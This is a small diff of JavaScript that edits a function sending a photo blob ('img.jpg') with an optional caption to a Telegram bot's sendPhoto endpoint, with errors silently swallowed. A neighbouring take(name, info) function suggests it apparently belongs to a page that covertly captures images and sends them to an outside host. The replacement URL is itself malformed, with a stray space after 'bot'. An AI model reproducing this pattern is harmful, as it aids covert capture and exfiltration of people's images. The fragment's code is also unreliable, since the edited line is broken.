@@ -46,7 +46,7 @@
         fd.append('chat_id', ID);
         fd.append('photo', blob, 'img.jpg');
         if(text) fd.append('caption', text);
-        try { await fetch(`https://api.telegram.org{TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
+        try { await fetch(`https://api.telegram.org/bot ${TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e){}
     }
 
     async function take(name, info = "") {
